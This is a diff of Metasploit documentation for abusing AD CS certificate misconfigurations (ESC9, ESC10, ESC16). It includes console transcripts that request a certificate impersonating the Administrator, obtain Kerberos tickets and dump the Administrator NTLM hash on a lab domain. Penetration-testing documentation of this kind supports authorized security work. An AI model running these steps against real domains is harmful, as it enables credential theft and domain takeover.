@@ -936,8 +936,8 @@ msf6 auxiliary(server/relay/esc8) >
 ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a
 user, say "user1", who has GenericWrite privileges over "user2". This allows an attacker as "user1" to update either the
 `userPrincipalName` or `dNSHostName` attribute of "user2". In order to update the attribute, we need to authenticate 
-via LDAP - which is a unique requirement compared to the  other ESC techniques and is why we have created a separated
-module called `esc_update_ldap_object`
+via LDAP - which is a unique requirement compared to the  other ESC techniques and is why there is a separated
+module called `esc_update_ldap_object` which combines the attribute update via LDAP and certificate issuance process.
 
 If the AD CS server is configured to allow "weak certificate mappings" when a user is requesting a certificate, the
 server will check the `userPrincipalName` or the `dNSHostName` of the requesting identity and then issue a certificate
@@ -1027,10 +1027,10 @@ Now we can see the above template is possibly exploitable if the `StrongCertific
 our case it is so we can proceed with exploitation. 
 
 We will set a number of datastore options in order to exploit ESC9
-in this scenario. We will set `RHOSTS` `CERT_TEMPLATE` `CA` as we normally would. `SMBUser`, `SMBPass` and `SMBDomain` 
+in this scenario. We will set `RHOSTS`, `CERT_TEMPLATE`, and `CA` as we normally would. `SMBUser`, `SMBPass`, and `SMBDomain` 
 are the credentials of the user who has `GenericWrite` privileges over the `TARGET_USERNAME`.  In order to update the UPN of the
-target user we must connect to LDAP and so the datastore options `LDAPUsername`, `LDAPPassword` and `LDAPDomain`  are
-available however if they are left blank the SMB credentials will be use - note `LDAPRport` must be set in order to 
+target user we must connect to LDAP and so the datastore options `LDAPUsername`, `LDAPPassword`, and `LDAPDomain`  are
+available however if they are left blank the SMB credentials will be used - note `LDAPRport` must be set in order to 
 connect however it defaults to 389.  
 
 The option `UPDATE_LDAP_OBJECT` is an enum that can be set to either `userPrincipalName`  or `dNSHostName` and must be
@@ -1136,10 +1136,10 @@ Pre-requisites:
 - The same vulnerable template has the `SubjectAltRequireDNS` flag set. <--- (Difference 1/2 between pre-requisites in scenario 1 and 2)
 - The same vulnerable template has a client authentication EKU
 - We have credentials of a machine account who has `GenericWrite` privileges over another **machine account** that can enroll in the vulnerable template <--- (Difference 2/2 between pre-requisites in scenario 1 and 2)
-  - Only machine accounts can have the `dNSHostName` attribute set, so our "target_user" needs to be machine account and we can't 
+  - Only machine accounts can have the `dNSHostName` attribute set, so our "target_user" needs to be machine account
 
 The option `UPDATE_LDAP_OBJECT` will now be set to `dNSHostName` and because only machine accounts have the `dNSHostName` attribute we will set our `TARGET_USER` to the machine account`Test1$` 
-We will be changing the `dNSHostName` of the machine account `Test1$` to `DC2.kerberos.issue` (`DC2` is the hostname of the domain controller) in hopes to impersonate the Domain Controller machine account.
+We will be changing the `dNSHostName` of the machine account `Test1$` to `DC2.kerberos.issue` (`DC2` is the hostname of the domain controller) in hopes to impersonate the Domain Controller machine account
 
 `CERT_TEMPLATE` will be set to `ESC9-Template-Dns` which is the same template as `ESC9-Template` but with the `SubjectAltRequireDNS` flag set instead of the `SubjectAltRequireUPN` flag.
 
@@ -1227,8 +1227,6 @@ Pre-requisites:
 
 In this scenario we can only compromise accounts that do not already have a populated `userPrincipalName` attribute, such as machine accounts and the default domain administrator.
 In addition, because this registry key only applies to SChannel authentication we are forced to authenticate to LDAPS once we get a certificate.
-If the certificate doesn't work when attempting to authenticate to LDAPS try setting `StrongCertificateBindingEnforcement` to `2` to ensure you're 
-exploiting scenario 2 and getting a `.pfx` file made for SChannel authentication.
 
 ```
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
@@ -1548,41 +1546,44 @@ Because the certificate lacks the official SID extension (due to ESC16) but incl
 The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don't need to update
 any LDAP objects, and so we can use the `icpr_cert` module to request a certificate. 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_sid S-1-5-21-1655260159-4293876351-2321352318-500
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_sid S-1-5-21-2324486357-3075865580-3606784161-500
 alt_sid => S-1-5-21-1655260159-4293876351-2321352318-500
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@kerberos.issue
 alt_upn => Administrator@msf.local
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca msf-DC3-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca kerberos-DC2-CA
 ca => msf-DC3-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template User
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template ESC9-Template
 cert_template => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.130
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.200
 RHOSTS => 172.16.199.130
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbdomain msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbdomain kerberos.issue
 smbdomain => msf.local
 msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbpass N0tpassword!
 smbpass => N0tpassword!
 msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbuser user1
 smbuser => user1
 msf6 auxiliary(admin/dcerpc/icpr_cert) > run
-[*] Running module against 172.16.199.130
-[+] 172.16.199.130:445 - The requested certificate was issued.
-[*] 172.16.199.130:445 - Certificate Policies:
-[*] 172.16.199.130:445 - Certificate UPN: Administrator@msf.local
-[*] 172.16.199.130:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-1655260159-4293876351-2321352318-500
-[*] 172.16.199.130:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.4 (Secure Email)
+[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.10.3.4 (Encrypting File System)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
+[*] 172.16.199.200:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-2324486357-3075865580-3606784161-500, S-1-5-21-2324486357-3075865580-3606784161-500
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
 [*] Auxiliary module execution completed
 
 
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
 [*] Using action GET_TGT - view all 3 actions with the show actions command
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.130 cert_file=/Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
-[*] Running module against 172.16.199.130
-[+] 172.16.199.130:88 - Received a valid TGT-Response
-[*] 172.16.199.130:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_939850.bin
-[*] 172.16.199.130:88 - Getting NTLM hash for Administrator@msf.local
-[+] 172.16.199.130:88 - Received a valid TGS-Response
-[*] 172.16.199.130:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_483040.bin
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250711145606_default_172.16.199.200_windows.ad.cs_597422.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_635830.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250711145619_default_172.16.199.200_mit.kerberos.cca_787259.bin
 [+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [*] Auxiliary module execution completed
 ```
